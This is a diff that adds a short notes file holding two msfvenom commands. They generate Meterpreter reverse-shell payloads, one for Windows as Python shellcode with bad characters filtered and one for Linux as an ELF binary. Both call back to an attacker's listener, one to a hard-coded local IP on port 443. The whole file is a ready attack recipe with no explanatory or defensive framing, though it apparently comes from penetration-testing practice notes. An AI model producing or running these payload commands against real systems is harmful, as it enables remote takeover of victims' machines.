@@ -1,0 +1,5 @@
+# Generate metepreter reverse shell without bad chars
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.19 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
